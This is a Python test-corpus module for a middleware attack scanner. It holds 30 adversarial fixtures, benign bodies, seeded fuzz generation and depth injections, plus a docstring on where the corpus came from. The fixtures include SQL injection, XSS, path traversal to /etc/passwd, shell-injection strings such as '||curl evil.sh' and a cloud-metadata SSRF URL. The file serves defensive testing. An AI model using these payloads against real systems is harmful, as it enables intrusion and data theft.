"""The 30 037-case attack-scan corpus, promoted from glm5.3's differential probe.

WHAT THIS IS
    The corpus that glm5.3's per-group-merge differential probe ran over: 30
    adversarial fixtures, 3 large benign bodies, 30 000 seeded fuzz bodies and
    4 depth-injection bodies. It is promoted here as a REUSABLE CORPUS with
    its seed checked in, so that a claim about the attack scan can be
    executed by CI rather than asserted in prose.

WHAT THIS IS NOT
    It is NOT an oracle for glm5.3's design. That design was rejected on
    principle (a Python re-implementation of the regex engine's selection,
    resume and overlap-suppression semantics is a correctness surface, not an
    optimisation), and a differential test against a rejected implementation
    has no stable expected side. So the rejected implementation does not
    travel with the corpus. Only the corpus does.

PROVENANCE
    The probe was `reports/perf_review_2026-10-04/attack_scan_equivalence_probe.py`
    (staff-engineer plan, item OPT-1), an untracked working file. The plan
    pack `PLAN_FOR_ADVANCED_OPTIMIZATIONS_ROUND_1_glm5.3.md` named it and
    quoted its result (30 037 differential checks, 0 mismatches). The audit
    row C-18 recorded that "glm5.3's 30 037-case oracle is not reproducible
    from the repo (the probe script is not checked in under `tests/`), so it
    is currently an unverifiable assertion."

    The corpus composition below is transcribed from that probe verbatim, and
    the count is exact: 30 + 3 + 30 000 + 4 = 30 037.

THE SEED
    20261004 - the same seed the A-1 differential oracle uses
    (`tests/unit/middleware/test_attack_pruning_differential.py`), so the two
    corpora are reproducible from one another. It is checked in here, in
    source, which is what makes the corpus reproducible at all.
"""

from __future__ import annotations

import random
from functools import cache

SEED = 20261004
FUZZ_CASE_COUNT = 30_000
DEPTH_PERCENTAGES = (0, 50, 90, 99)
ADVERSARIAL_FIXTURE_COUNT = 30
LARGE_FIXTURE_COUNT = 3
DEPTH_CASE_COUNT = len(DEPTH_PERCENTAGES)
CORPUS_SIZE = (
    ADVERSARIAL_FIXTURE_COUNT + LARGE_FIXTURE_COUNT + FUZZ_CASE_COUNT + DEPTH_CASE_COUNT
)

SQLI = b"UNION SELECT password FROM users"
BENIGN_40K = b'{"color":"blue","sort":"for","items":"' + b"x" * (40 * 1024) + b'"}'
BENIGN_128K = b'{"color":"blue","sort":"for","items":"' + b"x" * (120 * 1024) + b'"}'
CLEAN_60K = b'{"items":"' + b"x" * (60 * 1024) + b'"}'
MULTIPART = (
    b"--boundary\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\n\r\n"
    b"hello\r\n--boundary--\r\n"
)

ADVERSARIAL: tuple[bytes, ...] = (
    SQLI,
    b"' OR 1=1 --",
    b"'; DROP TABLE users; --",
    b"1;DELETE FROM accounts WHERE '1'='1",
    b"admin'--\n",
    b";--",
    b"x;--",
    b"EXEC xp_cmdshell 'dir'",
    b"<script>alert(1)</script>",
    b"<img src=x onerror=alert(1)>",
    b'<a onmouseover="steal()">x',
    b"javascript:alert(document.cookie)",
    b"<iframe src=//evil></iframe>",
    b"<object data=//evil>",
    b"../../etc/passwd",
    b"%2e%2e%2f%2e%2e%2fetc",
    b"..%2fetc",
    b";cat /etc/passwd",
    b"&&whoami",
    b"||curl evil.sh",
    b"http://169.254.169.254/latest/meta-data",
    b"a" * 300 + b"union" + b"b" * 300 + b"select",
    b"union" + b"x" * 70000 + b"select",
    b"'" + b"y" * 200 + b"--" + b"z" * 10,
    b";" + b"y" * 199 + b"--" + b"z" * 10,
    b"<" + b"q" * 511 + b" onx=",
    b"or 1=1",
    b"or  '1'='1",
    b"\x00\x01\x02union\x03select\xff",
    MULTIPART,
)

VOCABULARY: tuple[bytes, ...] = (
    b"union",
    b"select",
    b"or",
    b"order",
    b"color",
    b"for",
    b"drop",
    b"table",
    b"delete",
    b"from",
    b"exec",
    b"xp_",
    b"--",
    b";",
    b"||",
    b"&&",
    b"<script",
    b"</script>",
    b"<",
    b">",
    b"onerror",
    b"javascript",
    b"=",
    b"'",
    b'"',
    b"../",
    b"%2e%2e%2f",
    b"%2e%2e/",
    b"cat",
    b"ls",
    b"id",
    b"whoami",
    b"ping",
    b"curl",
    b"wget",
    b"169.254.169.254",
    b"iframe",
    b"object",
    b"\r",
    b"\n",
    b" ",
    b"1",
    b"x",
    b"{",
    b"}",
)


def random_body(rng: random.Random) -> bytes:
    """A random body built from the attack vocabulary."""
    length = rng.randint(0, 40)
    return b"".join(rng.choice(VOCABULARY) for _ in range(length))


def fuzz_bodies(seed: int = SEED) -> list[bytes]:
    """The seeded fuzz bodies, in the probe's order."""
    rng = random.Random(seed)
    return [random_body(rng) for _ in range(FUZZ_CASE_COUNT)]


def depth_injections() -> list[bytes]:
    """The 0/50/90/99 % depth injections into the 128 KB benign body."""
    bodies: list[bytes] = []
    for depth_pct in DEPTH_PERCENTAGES:
        position = max(0, int(len(BENIGN_128K) * depth_pct / 100) - 5)
        bodies.append(BENIGN_128K[:position] + b"' OR 1=1 --" + BENIGN_128K[position:])
    return bodies


@cache
def build_corpus() -> tuple[bytes, ...]:
    """The full 30 037-case corpus, in the probe's order.

    Built lazily: the three large benign bodies plus the four injections are
    about 700 KiB and the 30 000 fuzz bodies about 7 MiB, which is too much to
    materialise at import time for every test that merely imports the module.
    """
    fixtures = (*ADVERSARIAL, BENIGN_40K, BENIGN_128K, CLEAN_60K)
    return (*fixtures, *fuzz_bodies(), *depth_injections())


__all__ = [
    "ADVERSARIAL",
    "ADVERSARIAL_FIXTURE_COUNT",
    "BENIGN_128K",
    "BENIGN_40K",
    "CLEAN_60K",
    "CORPUS_SIZE",
    "DEPTH_CASE_COUNT",
    "DEPTH_PERCENTAGES",
    "FUZZ_CASE_COUNT",
    "LARGE_FIXTURE_COUNT",
    "MULTIPART",
    "SEED",
    "SQLI",
    "VOCABULARY",
    "build_corpus",
    "depth_injections",
    "fuzz_bodies",
    "random_body",
]
